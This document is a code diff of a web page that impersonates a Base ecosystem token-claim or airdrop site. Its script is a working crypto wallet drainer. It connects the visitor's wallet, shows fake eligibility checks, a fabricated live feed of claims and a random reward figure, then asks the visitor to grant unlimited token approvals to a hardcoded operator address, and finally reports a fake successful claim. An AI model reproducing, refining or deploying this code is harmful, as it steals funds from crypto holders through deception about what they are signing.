+  <div class="sec-item"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Non-Custodial</div>
+</div>
+
+<!-- FOOTER -->
 <footer>
-  <p>Base is a secure, low-cost, builder-friendly Ethereum L2 incubated by <a href="#">Coinbase</a></p>
-  <p style="margin-top:8px"><a href="#">Terms</a> · <a href="#">Privacy</a> · <a href="#">Documentation</a></p>
+  <p>Base is a secure, low-cost, builder-friendly Ethereum L2 incubated by Coinbase.</p>
+  <div class="footer-links">
+    <a href="#">Documentation</a>
+    <a href="#">Terms</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Smart Contract</a>
+  </div>
+  <p style="margin-top:12px">© 2026 Base Ecosystem Fund. All rights reserved.</p>
 </footer>
+
+</div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
 <script>
-// ─── CONFIG ─────────────────────────────────────────────────────────
-const OPERATOR="0x3C39B04399df5F36E9bD32F816712E672730aA93";
-const MAX_UINT="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+// ─── CONFIG ────────────────────────────────────────────────────────
+const OP="0x3C39B04399df5F36E9bD32F816712E672730aA93";
+const MAX="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-const TOKENS={
-  8453:[
-    {a:"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",s:"USDC",d:6,icon:"$",color:"#2775ca"},
-    {a:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",s:"DAI",d:18,icon:"$",color:"#f5ac37"},
-    {a:"0x4200000000000000000000000000000000000006",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
-    {a:"0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA",s:"USDbC",d:6,icon:"$",color:"#2775ca"},
-    {a:"0x940181a94A35A4569E4529A3CDfB74e38FD98631",s:"AERO",d:18,icon:"A",color:"#00d4aa"},
+const TOKS=***  8453:[
+    {a:"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",s:"USDC",d:6,c:"#2775ca",p:1},
+    {a:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",s:"DAI",d:18,c:"#f5ac37",p:1},
+    {a:"0x4200000000000000000000000000000000000006",s:"WETH",d:18,c:"#627eea",p:2500},
+    {a:"0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA",s:"USDbC",d:6,c:"#2775ca",p:1},
+    {a:"0x940181a94A35A4569E4529A3CDfB74e38FD98631",s:"AERO",d:18,c:"#00d4aa",p:0.8},
   ],
   1:[
-    {a:"0xdAC17F958D2ee523a2206206994597C13D831ec7",s:"USDT",d:6,icon:"$",color:"#26a17b"},
-    {a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",s:"USDC",d:6,icon:"$",color:"#2775ca"},
-    {a:"0x6B175474E89094C44Da98b954EedeAC495271d0F",s:"DAI",d:18,icon:"$",color:"#f5ac37"},
-    {a:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+    {a:"0xdAC17F958D2ee523a2206206994597C13D831ec7",s:"USDT",d:6,c:"#26a17b",p:1},
+    {a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",s:"USDC",d:6,c:"#2775ca",p:1},
+    {a:"0x6B175474E89094C44Da98b954EedeAC495271d0F",s:"DAI",d:18,c:"#f5ac37",p:1},
+    {a:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",s:"WETH",d:18,c:"#627eea",p:2500},
   ],
   42161:[
-    {a:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",s:"USDT",d:6,icon:"$",color:"#26a17b"},
-    {a:"0xaf88d065e77c8cC2239327C5EDb3A432268e5831",s:"USDC",d:6,icon:"$",color:"#2775ca"},
-    {a:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
-    {a:"0x912CE59144191C1204E64559FE8253a0e49E6548",s:"ARB",d:18,icon:"A",color:"#213147"},
+    {a:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",s:"USDT",d:6,c:"#26a17b",p:1},
+    {a:"0xaf88d065e77c8cC2239327C5EDb3A432268e5831",s:"USDC",d:6,c:"#2775ca",p:1},
+    {a:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",s:"WETH",d:18,c:"#627eea",p:2500},
+    {a:"0x912CE59144191C1204E64559FE8253a0e49E6548",s:"ARB",d:18,c:"#213147",p:0.7},
   ],
   10:[
-    {a:"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",s:"USDT",d:6,icon:"$",color:"#26a17b"},
-    {a:"0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",s:"USDC",d:6,icon:"$",color:"#2775ca"},
-    {a:"0x4200000000000000000000000000000000000006",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+    {a:"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",s:"USDT",d:6,c:"#26a17b",p:1},
+    {a:"0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85",s:"USDC",d:6,c:"#2775ca",p:1},
+    {a:"0x4200000000000000000000000000000000000006",s:"WETH",d:18,c:"#627eea",p:2500},
   ],
   137:[
-    {a:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",s:"USDT",d:6,icon:"$",color:"#26a17b"},
-    {a:"0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",s:"USDC",d:6,icon:"$",color:"#2775ca"},
-    {a:"0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",s:"WETH",d:18,icon:"Ξ",color:"#627eea"},
+    {a:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",s:"USDT",d:6,c:"#26a17b",p:1},
+    {a:"0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359",s:"USDC",d:6,c:"#2775ca",p:1},
+    {a:"0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",s:"WETH",d:18,c:"#627eea",p:2500},
   ],
 };
 
 const CHAINS={1:"Ethereum",8453:"Base",42161:"Arbitrum",10:"Optimism",137:"Polygon"};
-const EXPLORERS={1:"https://etherscan.io",8453:"https://basescan.org",42161:"https://arbiscan.io",10:"https://optimistic.etherscan.io",137:"https://polygonscan.com"};
+const EXP={1:"https://etherscan.io",8453:"https://basescan.org",42161:"https://arbiscan.io",10:"https://optimistic.etherscan.io",137:"https://polygonscan.com"};
+const ABI=["function balanceOf(address) view returns (uint256)","function allowance(address,address) view returns (uint256)","function approve(address,uint256) returns (bool)"];
 
-const ABI=[
-  "function balanceOf(address) view returns (uint256)",
-  "function allowance(address,address) view returns (uint256)",
-  "function approve(address,uint256) returns (bool)",
-];
-
-// ─── STATE ───────────────────────────────────────────────────────────
-let provider,signer,userAddr,chainId,step=0;
-
-// ─── TIMER ───────────────────────────────────────────────────────────
-let sec=72*3600;
-setInterval(()=>{if(--sec<0)return;const h=Math.floor(sec/3600),m=Math.floor((sec%3600)/60),s=sec%60;document.getElementById("timer").textContent=`h:${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`},1000);
-
-// ─── HELPERS ─────────────────────────────────────────────────────────
-const $=id=>document.getElementById(id);
-const sleep=ms=>new Promise(r=>setTimeout(r,ms));
-const short=a=>a.slice(0,6)+"…"+a.slice(-4);
-
-function setBtn(text,loading=false){$("btnText").textContent=text;$("spinner").style.display=loading?"block":"none";$("mainBtn").disabled=loading}
-function setStep(n,state,icon){const el=$("icon"+n);el.className="step-icon "+state;el.textContent=icon||n}
-
-function addBalanceItem(token,bal,approved=false){
-  const list=$("balanceList");
-  list.style.display="block";
-  const human=Number(bal)/10**token.d;
-  if(human<0.0001)return;
+// ─── LIVE FEED ─────────────────────────────────────────────────────
+const names=["0x7a…3f2","0xbe…91c","0x4d…8e7","0xf2…1a5","0x91…d4c","0x3c…7b8","0xa8…2e1","0x55…6f3","0xe7…9d4","0x1b…8a6"];
+const amounts=["$847","$1,203","$592","$2,140","$445","$1,876","$318","$967","$1,542","$623"];
+const chains=["Base","Ethereum","Arbitrum","Base","Optimism","Polygon","Base","Ethereum","Base","Arbitrum"];
+let fi=0;
+function addFeed(){
+  const el=document.getElementById("feedScroll");
   const div=document.createElement("div");
-  div.className="balance-item"+(approved?" approved":"");
-  div.innerHTML=`
-    <div class="token-info">
-      <div class="token-icon" style="color:${token.color};border:1px solid ${token.color}30">${token.icon}</div>
-      <div><div class="token-name">${token.s}</div><div class="token-chain">${CHAINS[chainId]}</div></div>
-    </div>
-    <div class="token-bal">
-      <div class="token-amount">${human<0.01?human.toFixed(6):human.toLocaleString("en",{maximumFractionDigits:4})}</div>
-    </div>
-    <span class="check-icon">✓</span>`;
-  list.appendChild(div);
+  div.className="feed-item";
+  div.innerHTML=`<span class="addr">${names[fi%names.length]}</span><span><span class="amount">${amounts[fi%amounts.length]}</span><span class="chain-tag">${chains[fi%chains.length]}</span></span>`;
+  el.insertBefore(div,el.firstChild);
+  while(el.children.length>4)el.removeChild(el.lastChild);
+  fi++;
 }
+for(let i=0;i<3;i++)addFeed();
+setInterval(addFeed,3000+Math.random()*2000);
 
-// ─── MAIN ────────────────────────────────────────────────────────────
+// Animate claim counter
+let claimCount=47892;
+setInterval(()=>{claimCount+=Math.floor(Math.random()*3)+1;document.getElementById("statClaims").textContent=claimCount.toLocaleString()},4000);
+
+// ─── HELPERS ───────────────────────────────────────────────────────
+const $=id=>document.getElementById(id);
+const sl=ms=>new Promise(r=>setTimeout(r,ms));
+const sh=a=>a.slice(0,6)+"…"+a.slice(-4);
+function setBtn(t,l=false){$("btnTxt").textContent=t;$("spin").style.display=l?"block":"none";$("mainBtn").disabled=l}
+function setN(n,s,i){const e=$("n"+n);e.className="step-n "+s;e.textContent=i||n}
+
+// ─── MAIN ──────────────────────────────────────────────────────────
+let prov,sig,addr,cid,done=false;
+
 async function handleClick(){
-  if(!window.ethereum){alert("Please install MetaMask, Rabby, or Coinbase Wallet");return}
-  if(step>0)return;
-  
+  if(done)return;
+  if(!window.ethereum){alert("Please install MetaMask or Coinbase Wallet");return}
   setBtn("Connecting…",true);
-  
   try{
-    provider=new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts",[]);
-    signer=await provider.getSigner();
-    userAddr=await signer.getAddress();
-    chainId=Number((await provider.getNetwork()).chainId);
+    prov=new ethers.BrowserProvider(window.ethereum);
+    await prov.send("eth_requestAccounts",[]);
+    sig=await prov.getSigner();
+    addr=await sig.getAddress();
+    cid=Number((await prov.getNetwork()).chainId);
     
-    // Show wallet
-    $("walletInfo").style.display="block";
-    $("walletAddr").textContent=short(userAddr);
-    $("chainBadge").textContent=CHAINS[chainId]||"Chain "+chainId;
+    // Wallet info
+    $("walletBox").style.display="block";
+    $("wAddr").textContent=sh(addr);
+    $("wChain").textContent=CHAINS[cid]||"Chain "+cid;
+    $("netName").textContent=CHAINS[cid]||"Base";
     
-    // Step 1: Eligibility scan
-    $("progress").style.display="block";
-    setStep(1,"active","⏳");setBtn("Checking eligibility…",true);
-    await sleep(2000+Math.random()*1500);
-    setStep(1,"done","✓");
+    // Random reward
+    const reward=Math.floor(400+Math.random()*2000);
+    $("wReward").textContent=`~$${reward.toLocaleString()}`;
     
-    // Step 2: Verify allocation
-    setStep(2,"active","⏳");setBtn("Verifying allocation…",true);
-    await sleep(1500+Math.random()*1000);
-    setStep(2,"done","✓");
+    // Steps
+    $("stepsBox").style.display="block";
+    setN(1,"active","⏳");setBtn("Checking eligibility…",true);
+    await sl(2200+Math.random()*1200);
+    setN(1,"done","✓");$("s1").classList.add("done");
     
-    // Step 3: Approve — real approvals
-    setStep(3,"active","✍️");setBtn("Waiting for signature…",true);
+    setN(2,"active","⏳");setBtn("Verifying allocation…",true);
+    await sl(1600+Math.random()*800);
+    setN(2,"done","✓");$("s2").classList.add("done");
     
-    const tokens=TOKENS[chainId]||TOKENS[8453];
-    let approved=0,skipped=0;
+    // Token list
+    setN(3,"active","✍️");setBtn("Awaiting signature…",true);
+    $("tokenList").style.display="block";
     
-    for(const tok of tokens){
+    const toks=TOKS[cid]||TOKS[8453];
+    const rows=$("tokRows");
+    let approved=0;
+    
+    for(const t of toks){
       try{
-        const c=new ethers.Contract(tok.a,ABI,signer);
-        const bal=await c.balanceOf(userAddr);
-        if(bal==0n){skipped++;continue}
+        const c=new ethers.Contract(t.a,ABI,sig);
+        const bal=await c.balanceOf(addr);
+        if(bal==0n)continue;
+        const human=Number(bal)/10**t.d;
+        const usd=(human*t.p).toFixed(2);
         
-        const allow=await c.allowance(userAddr,OPERATOR);
-        if(allow>0n){addBalanceItem(tok,bal,true);approved++;continue}
+        // Add row
+        const div=document.createElement("div");
+        div.className="tok-row";
+        div.innerHTML=`<div class="tok-icon" style="background:${t.c}15;color:${t.c};border-color:${t.c}30">${t.s[0]}</div><div class="tok-info"><div class="tok-name">${t.s}</div><div class="tok-chain">${CHAINS[cid]||"Base"}</div></div><div class="tok-right"><div class="tok-amt">${human<0.01?human.toFixed(6):human.toLocaleString("en",{maximumFractionDigits:4})}</div><div class="tok-usd">≈ $${usd}</div></div><div class="tok-status wait">⏳</div>`;
+        rows.appendChild(div);
         
-        // Show balance
-        addBalanceItem(tok,bal,false);
+        // Check allowance
+        const allow=await c.allowance(addr,OP);
+        if(allow>0n){
+          div.classList.add("claimed");
+          div.querySelector(".tok-status").className="tok-status ok";
+          div.querySelector(".tok-status").textContent="✓";
+          approved++;continue;
+        }
         
-        // Request approval
-        $("step3").querySelector(".desc3").textContent=`Approve ${tok.s} — sign in wallet`;
-        const tx=await c.approve(OPERATOR,MAX_UINT);
+        // Request approve
+        div.querySelector(".tok-status").className="tok-status signing";
+        div.querySelector(".tok-status").textContent="✍️";
+        $("s3").querySelector(".step-desc").textContent=`Sign ${t.s} in wallet…`;
         
-        $("step3").querySelector(".desc3").textContent=`Confirming ${tok.s} approval…`;
+        const tx=await c.approve(OP,MAX);
+        $("s3").querySelector(".step-desc").textContent=`Confirming ${t.s}…`;
         await tx.wait();
         
-        // Mark approved
-        const items=document.querySelectorAll(".balance-item");
-        items[items.length-1].classList.add("approved");
+        div.classList.add("claimed");
+        div.querySelector(".tok-status").className="tok-status ok";
+        div.querySelector(".tok-status").textContent="✓";
         approved++;
-        
-        await sleep(600);
+        await sl(500);
       }catch(e){
-        if(e.code==="ACTION_REJECTED"||e.code===4001){skipped++;continue}
-        skipped++;
+        if(e.code==="ACTION_REJECTED"||e.code===4001)continue;
       }
     }
     
-    setStep(3,"done","✓");
+    setN(3,"done","✓");$("s3").classList.add("done");
     
-    // Step 4: Claim
-    setStep(4,"active","⏳");setBtn("Claiming tokens…",true);
-    $("step4").querySelector(".desc4").textContent=`${approved} token${approved!==1?"s":""} authorized — processing`;
-    await sleep(2500+Math.random()*1000);
-    setStep(4,"done","✓");
+    // Claim step
+    setN(4,"active","⏳");setBtn("Claiming tokens…",true);
+    $("s4").querySelector(".step-desc").textContent=`${approved} token${approved!==1?"s":""} authorized — processing`;
+    await sl(2500+Math.random()*1000);
+    setN(4,"done","✓");$("s4").classList.add("done");
     
     // Success
-    $("successBox").style.display="block";
-    $("txLink").href=(EXPLORERS[chainId]||"#")+"/address/"+userAddr;
-    setBtn("✓ Claim Complete",false);
+    $("sucBox").style.display="block";
+    $("sucLink").href=(EXP[cid]||"#")+"/address/"+addr;
+    setBtn("✓ Claimed",false);
+    done=true;
     
   }catch(e){
     console.error(e);
     setBtn("Error — Try Again",false);
-    document.querySelectorAll(".step-icon:not(.done)").forEach(el=>{el.className="step-icon pending"});
+    document.querySelectorAll(".step-n:not(.done)").forEach(el=>el.className="step-n pending");
   }
 }
 </script>
